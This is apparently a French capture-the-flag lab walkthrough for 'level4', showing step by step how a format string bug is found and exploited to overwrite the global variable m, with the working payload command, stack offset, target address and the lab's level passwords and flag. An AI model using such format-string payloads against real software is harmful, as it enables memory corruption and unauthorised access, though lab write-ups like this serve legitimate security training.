# Level4 - Walkthrough

## Objectif
Utiliser une format string vulnerability pour écrire la valeur 16930116 dans la variable globale `m`.

---

## Étape 1 : Connexion

```bash
ssh level4@localhost -p 4242
# Mot de passe : b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

---

## Étape 2 : Reconnaissance

```bash
ls -la
./level4
test
# test
```

Même comportement que level3.

---

## Étape 3 : Identifier la vulnérabilité

```bash
python -c "print('%x %x %x')" | ./level4
```

Format string vulnerability confirmée.

---

## Étape 4 : Trouver l'adresse de m

Dans Ghidra, chercher la variable globale `m`.

Adresse : `0x08049810`

La condition est : `if (m == 0x1025544)` → `m` doit être égal à 16930116 (0x1025544 en hexa).

---

## Étape 5 : Trouver la position sur la stack

```bash
python -c "print('AAAA' + '%x.'*15)" | ./level4
```

Résultat :
```
AAAAb7ff26b0.bffff794...41414141.252e7825...
```

`41414141` (AAAA) apparaît en **12ème position**.

---

## Étape 6 : Construction du payload

Le problème : écrire 16930116 caractères serait trop long.

**Solution** : Utiliser `%d` avec une largeur dynamique.

Structure :
- Adresse de `m` (4 octets) : `\x10\x98\x04\x08`
- Format avec largeur : `%16930112d` (16930116 - 4 octets déjà affichés)
- Format specifier pour écrire : `%12$n`

Total de caractères : 4 + 16930112 = **16930116**

---

## Étape 7 : Exploitation

```bash
(python -c "print('\x10\x98\x04\x08' + '%16930112d' + '%12\$n')"; cat) | ./level4
```

Le programme affiche le flag directement (via `system("/bin/cat /home/user/level5/.pass")`).

---

## Étape 8 : Passer au niveau suivant

```bash
su level5
# Mot de passe : 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

---

## Flag
```
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```
